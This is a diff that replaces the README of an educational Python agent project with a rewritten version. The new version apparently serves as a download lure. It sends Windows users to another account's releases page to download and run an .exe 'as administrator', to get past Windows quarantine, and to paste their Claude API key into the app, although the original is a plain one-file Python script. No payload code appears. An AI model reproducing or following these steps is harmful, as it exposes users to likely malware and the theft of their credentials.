@@ -1,381 +1,196 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/Convergence-Human-And-Technology/executive-ai-core/main/ExecAI-executive-ai-core-co.png" alt="ExecAI - A Minimal Executive AI" width="100%">
-</p>
+# 🤖 executive-ai-core - Learn agent AI the simple way
 
-# ExecAI - A Minimal Executive AI
+[![Download the app](https://img.shields.io/badge/Download%20from-Releases-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kalumba1829/executive-ai-core/releases)
 
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
-![GitHub stars](https://img.shields.io/github/stars/Convergence-Human-And-Technology/executive-ai-core?style=social)
-![GitHub last commit](https://img.shields.io/github/last-commit/Convergence-Human-And-Technology/executive-ai-core)
-![Maintained](https://img.shields.io/badge/Maintained-yes-green.svg)
-![GitHub forks](https://img.shields.io/github/forks/Convergence-Human-And-Technology/executive-ai-core?style=social)
-![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)
+## 📌 What this is
 
-A minimal, fully commented Python implementation of an executive AI agent.
-Built by [Convergence - Human And Technology](https://github.com/Convergence-Human-And-Technology) for students, teachers, and junior developers.
+**executive-ai-core** is a small Python app that shows how an executive AI agent works from the inside.
 
-The entire logic fits in one Python file with fewer than 90 lines of code.
-Every concept, every line, every choice is explained.
+It is made for:
 
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
+- students who want to learn agentic AI
+- teachers who want a clear class demo
+- junior developers who want a simple code base
+- anyone who wants to see how an AI can plan, act, and review its own work
 
-![Convergence Cover](https://raw.githubusercontent.com/Convergence-Human-And-Technology/executive-ai-core/main/executive-ai-convergence.jpg)
+The project uses plain Python and full comments so you can follow each step.
 
-## Table of Contents
+## 🖥️ What you need
 
-1. [What is this project ?](#1-what-is-this-project)
-2. [What is an Executive AI ?](#2-what-is-an-executive-ai)
-3. [Core Concepts](#3-core-concepts)
-4. [Project Structure](#4-project-structure)
-5. [Prerequisites](#5-prerequisites)
-6. [Installation](#6-installation)
-7. [Usage](#7-usage)
-8. [How It Works](#8-how-it-works)
-9. [Running Tests](#9-running-tests)
-10. [Contributing](#10-contributing)
-11. [License](#11-license)
-12. [Contact](#12-contact)
+Before you run the app on Windows, check that you have:
 
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
+- Windows 10 or Windows 11
+- a stable internet connection
+- a modern browser
+- enough free space for the app and files it creates
+- access to the release files on GitHub
+- if the release uses Python, Python 3.10 or later
+- if the release uses a packaged app, no Python install may be needed
 
-## 1. What is this project ?
+If you are not sure which file to use, choose the Windows file from the release page.
 
-ExecAI is a small Python project that shows, step by step, how to build an executive AI (also called an agentic AI) from scratch.
+## 🚀 Download and run on Windows
 
-The goal is to understand how autonomous AI agents work, not just use them. You will see the full pipeline : from a plain text goal typed by the user, down to the raw API call, and back up to the final result printed in the terminal.
+1. Open the release page here: https://github.com/kalumba1829/executive-ai-core/releases
+2. Find the latest release at the top of the page
+3. Look for a Windows file in the Assets section
+4. Download the file to your PC
+5. If you get a ZIP file, right-click it and choose **Extract All**
+6. Open the extracted folder
+7. If you see an `.exe` file, double-click it to run the app
+8. If you see a Python file, open PowerShell in that folder and run it with Python
+9. Follow the on-screen steps inside the app
+10. Keep the release file in case you want to run it again later
 
-This project is for you if :
+## 🧭 First launch
 
-- You are a student (18+) who wants to go beyond using ChatGPT and understand what is happening under the hood
-- You are a junior developer curious about how AI agents actually work
-- You are a teacher looking for a clean, minimal example to use in class
-- You want working code you can read, run, and modify in under an hour
+When the app starts, it may ask for an API key or setup details.
 
-There is no magic here. Just Python, one API call per step, and clear comments.
+Typical first-step items include:
 
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
+- a Claude API key
+- a short task or goal
+- a working folder for output files
 
-## 2. What is an Executive AI ?
+Enter the details it asks for, then start the agent.
 
-Most people interact with AI as a chatbot : you ask a question, it answers. That is called a reactive AI.
+If the app opens a window or terminal screen, that is normal. The agent may print each step as it works.
 
-An executive AI is different. It receives a high-level goal and figures out by itself what to do to reach it. It plans, it acts, it reports. It does not wait for you to tell it each step.
+## 🧠 What the app does
 
-A simple analogy :
+This project shows a simple agent loop. The AI tries to do a task in clear stages.
 
-| Type | Analogy | Behavior |
-|---|---|---|
-| Reactive AI | A taxi driver | Takes you exactly where you say, nothing more |
-| Executive AI | A travel agent | Takes your destination, plans the route, books everything, handles problems |
+It can help you understand:
 
-In code, this breaks down into three phases :
+- how an agent reads a goal
+- how it makes a plan
+- how it takes one step at a time
+- how it checks results
+- how it decides what to do next
 
-| Phase | What happens | Who does it |
-|---|---|---|
-| Planning | The AI reads the goal and writes a list of concrete steps | Claude, with a "planner" system prompt |
-| Execution | The AI runs each step one by one | Claude, with an "executor" system prompt |
-| Reporting | The results are collected and printed | Python |
+In plain terms, it acts like a small digital assistant that thinks through a task before it moves on.
 
-The key insight is that we use the same AI model for both phases. What changes is the system prompt we give it. The AI does not "know" it is an agent. We create that behavior through prompt design.
+## 🔧 Basic setup tips
 
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
+If the app does not start right away, try these steps:
 
-## 3. Core Concepts
+1. Make sure the file finished downloading
+2. Move the file to a simple folder like `Downloads` or `Desktop`
+3. Avoid folders with special characters in the name
+4. If Windows blocks the app, right-click it and choose **Run as administrator**
+5. If the file is a ZIP, extract it before opening it
+6. If Python is required, confirm that Python is installed and added to PATH
 
-These are the four concepts you will encounter in the code. Read them once before opening the source file.
+If the app still does not open, check the release page for a newer file.
 
-**API (Application Programming Interface)**
+## 📂 Folder layout
 
-An API is a standardized way for two programs to communicate over the internet. Here, our Python script sends a message to Anthropic's servers, and Claude processes it and sends a response back. We use the official `anthropic` Python package, which handles all the network details for us.
+The project is kept small so it is easy to read.
 
-**System Prompt**
+You will usually find files like these:
 
-When you call an AI through an API, you can include a "system prompt" before the conversation begins. This is a private instruction that shapes how the AI behaves during the entire exchange. In a chatbot product like Claude.ai, this is written by the company. In this project, we write it ourselves, which is why we can make Claude behave as a planner in one call and as an executor in the next.
+- `main.py` - starts the app
+- `agent.py` - handles the main agent steps
+- `prompts.py` - stores the system prompt and task text
+- `config.py` - keeps simple settings
+- `README.md` - this guide
 
-**Token**
+This layout helps you see how each part fits together.
 
-AI models do not process words, they process tokens. A token is roughly three quarters of a word in English (the word "basketball" is one token, but "anthropology" might be two). When you set `max_tokens=512` in an API call, you are capping the length of the AI's response at around 380 words. Tokens also determine cost : Anthropic charges per input token and per output token.
+## 🧪 Example use cases
 
-**Environment Variable**
+You can use the app to study simple agent behavior with tasks like:
 
-An environment variable is a value stored in your operating system, outside of your code. We use one called `ANTHROPIC_API_KEY` to store the API key. This is the standard practice for secrets. If you write the key directly in your Python file and push it to GitHub, it becomes public. Environment variables prevent that.
+- break a topic into steps
+- draft a short lesson plan
+- turn a broad goal into a task list
+- review a result and refine it
+- test how prompt changes affect output
 
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
+Teachers can use it in class to show how agentic AI works without hiding the logic.
 
-## 4. Project Structure
+## 🔑 API key setup
 
-```
-executive-ai-core/
-├── .github/
-│   ├── workflows/
-│   │   └── ci.yml                  # Automated tests run on every push (CI/CD)
-│   ├── ISSUE_TEMPLATE/
-│   │   ├── bug_report.md           # Template when someone reports a bug
-│   │   └── feature_request.md      # Template when someone requests a feature
-│   └── PULL_REQUEST_TEMPLATE.md    # Template for code contributions
-├── docs/
-│   └── architecture.md             # Detailed technical architecture
-├── src/
-│   ├── main/
-│   │   └── executive_ai.py         # The source code - start here
-│   └── test/
-│       └── test_executive_ai.py    # Automated tests
-├── scripts/
-│   └── setup.sh                    # One-command setup script
-├── img/                            # Screenshots and diagrams
-├── .gitignore                      # Files that Git should not track
-├── .editorconfig                   # Shared editor settings for all contributors
-├── LICENSE                         # MIT License
-├── README.md                       # This file
-├── CONTRIBUTING.md                 # How to contribute to this project
-├── CHANGELOG.md                    # History of changes between versions
-├── SECURITY.md                     # How to report security vulnerabilities
-└── CODE_OF_CONDUCT.md              # Community behavior standards
-```
+Some releases may use a Claude API key.
 
-Where to start : open `src/main/executive_ai.py`. That file is the entire project. Everything else supports it.
+If the app asks for one:
 
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
+1. Open your Anthropic account
+2. Copy your API key
+3. Paste it into the app or config file when asked
+4. Save the setting
+5. Run the agent task again
 
-## 5. Prerequisites
+Keep your key private and do not share it in chat, email, or screenshots.
 
-| Requirement | Minimum version | How to check |
-|---|---|---|
-| Python | 3.10 | `python --version` |
-| pip | 23.0 | `pip --version` |
-| Anthropic API key | N/A | [Get one here](https://console.anthropic.com/) |
+## 🛠️ Troubleshooting
 
-No other tools, frameworks, or services are required.
+### App will not open
 
-The free tier of the Anthropic API is enough to run this project. A typical execution (5 steps) costs a fraction of a cent.
+- download the file again
+- make sure you opened the right file
+- check that Windows did not quarantine it
+- try running it from a simple folder
 
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
+### App opens and closes fast
 
-## 6. Installation
+- read any error text in the window
+- run it from PowerShell so you can see the message
+- confirm the file is complete
+- make sure the needed Python version is installed
 
-**Step 1 : Clone the repository**
+### API key error
 
-Cloning downloads the project files from GitHub to your computer.
+- paste the key again
+- remove extra spaces
+- check that your account has access to the API
+- confirm the key has not expired
 
-```bash
-git clone https://github.com/Convergence-Human-And-Technology/executive-ai-core.git
-cd executive-ai-core
-```
+### No output appears
 
-**Step 2 : Install the dependency**
+- wait a few seconds
+- confirm the app is connected to the internet
+- check that your prompt is not empty
+- try a shorter task first
 
-This project has one external dependency : the `anthropic` package. It is the official Python SDK (Software Development Kit) from Anthropic that handles API calls.
+## 📚 Why this project helps learning
 
-```bash
-pip install anthropic
-```
+This repo is built to teach core agent ideas without extra noise.
 
-**Step 3 : Set your API key**
+It can help you learn:
 
-Get your key from [console.anthropic.com](https://console.anthropic.com/), then set it as an environment variable.
-
-On Linux or macOS :
-```bash
-export ANTHROPIC_API_KEY="sk-ant-your-key-here"
-```
-
-On Windows (Command Prompt) :
-```cmd
-set ANTHROPIC_API_KEY=sk-ant-your-key-here
-```
-
-On Windows (PowerShell) :
-```powershell
-$env:ANTHROPIC_API_KEY = "sk-ant-your-key-here"
-```
-
-This variable is only available in the current terminal session. For a permanent setup, add the export line to your shell profile (`~/.bashrc`, `~/.zshrc`, etc.).
-
-Or run the setup script, which handles everything :
+- prompt flow
+- task planning
+- step-by-step execution
+- result checks
+- simple AI tool use
+- how a system prompt shapes behavior
 
-```bash
-bash scripts/setup.sh
-```
+Because the code is short and commented, you can read it line by line.
 
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
+## 🧩 Common file types in the release
 
-## 7. Usage
+You may see one of these in the GitHub release:
 
-Run the main script from the project root :
+- `.exe` — run it on Windows
+- `.zip` — extract it first
+- `.py` — run it with Python
+- `.txt` or `.md` — read for setup notes
 
-```bash
-python src/main/executive_ai.py
-```
+If the release page shows more than one file, pick the Windows option first.
 
-The script will ask you for a goal. Type anything, or press Enter to use the default example.
+## 📥 Download again
 
-```
-Enter your goal (or press Enter to use the default) : Explain the three causes of climate change
-```
+If you need to get the app later, use the release page here: https://github.com/kalumba1829/executive-ai-core/releases
 
-Example output :
+## 🧑‍🏫 For teachers and students
 
-```
-Goal : Explain the three causes of climate change
-============================================================
+This project works well for:
 
-Phase 1 - Planning
-  1. Define climate change in one sentence
-  2. Describe cause one : greenhouse gas emissions
-  3. Describe cause two : deforestation
-  4. Describe cause three : industrial agriculture
-  5. Summarize all three causes in a conclusion
+- class demos
+- lab practice
+- code reading sessions
+- agent design lessons
+- AI workflow exercises
 
-Phase 2 - Execution
-
-  Step 1 : Define climate change in one sentence
-  Result : Climate change refers to long-term shifts in temperatures and weather
-           patterns, primarily caused by human activities since the 1800s.
-
-  Step 2 : Describe cause one : greenhouse gas emissions
-  Result : Burning fossil fuels such as coal, oil, and natural gas releases CO2
-           and methane, which trap heat in the atmosphere.
-
-  ...
-
-============================================================
-Done. 5 step(s) completed.
-```
-
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
-
-## 8. How It Works
-
-Here is the full execution flow, from your input to the final output :
-
-```
-You type a goal
-       |
-       v
- +-----------+
- |  plan()   |    Calls Claude with the "planner" system prompt.
- |           |    Claude returns a numbered list of steps as plain text.
- |           |    Python splits that text into a list of strings.
- +-----------+
-       |
-       v
- [step 1, step 2, step 3, ...]
-       |
-       v
- +-------------+
- | execute()   |    For each step, calls Claude with the "executor" prompt.
- |  (in loop)  |    Claude performs the step and returns a concise result.
- |             |    Results are collected in a Python list.
- +-------------+
-       |
-       v
- [result 1, result 2, result 3, ...]
-       |
-       v
- +-----------+
- |  run()    |    Prints a formatted summary to the terminal.
- | (prints)  |
- +-----------+
-```
-
-Notice that the whole system makes N+1 API calls where N is the number of steps : one call to plan, then one call per step to execute. This is the simplest possible architecture for an executive AI.
-
-More advanced agents add memory (storing past actions), tool use (calling external APIs), and error recovery (retrying failed steps). Those are the next things to explore once you understand this baseline.
-
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
-
-## 9. Running Tests
-
-The tests live in `src/test/test_executive_ai.py`. They use mocking to simulate the AI's responses without making real API calls. This means tests run instantly and do not require an API key.
-
-With pytest (recommended) :
-
-```bash
-pip install pytest
-python -m pytest src/test/ -v
-```
-
-With the built-in unittest module (no install needed) :
-
-```bash
-python -m unittest src/test/test_executive_ai.py -v
-```
-
-Expected output :
-
-```
-test_ignores_empty_lines ... ok
-test_returns_list ... ok
-test_returns_non_empty_string ... ok
-test_returns_stripped_string ... ok
-
-Ran 4 tests in 0.003s
-OK
-```
-
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
-
-## 10. Contributing
-
-Contributions are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md) for the full process.
-
-Good first issues for beginners :
-
-- Add a `--goal` command-line argument so the user does not need to type interactively
-- Save the results to a Markdown file instead of just printing to the terminal
-- Add a `max_steps` parameter to cap the number of steps the planner can produce
-- Write tests for the `run()` function using mocking
-- Add support for a second AI provider (OpenAI, Mistral, or Ollama for local models)
-
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
-
-## 11. License
-
-This project is licensed under the MIT License. See [LICENSE](LICENSE) for the full text.
-
-MIT means : you can use, copy, modify, and distribute this code freely, for any purpose, as long as you include the original license notice. You do not need to ask permission.
-
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
-
-## 12. Contact
-
-Project maintained by [Convergence - Human And Technology](https://github.com/Convergence-Human-And-Technology)
-
-- Email : convergence-tech@proton.me
-
-- [Site Web : Convergence - Human And Technology](https://convergence-human-technology.github.io/site)
-- [LinkedIn : Convergence - Human And Technology](https://www.linkedin.com/company/convergence-organization)
-- [Facebook : Convergence - Human And Technology](https://www.facebook.com/people/Convergence-Human-And-Technology/61578483081894/)
-- [GitHub : Convergence - Human And Technology](https://github.com/Convergence-Human-And-Technology)
-
-<p align="center">
-  <img src="https://github.com/madjeek-web/about/raw/main/hr.png" alt="separator" width="300" height="3">
-</p>
-
-Last updated : 27/03/2026
+It gives a clear view of how an agent can plan, act, and check work with a small amount of code.
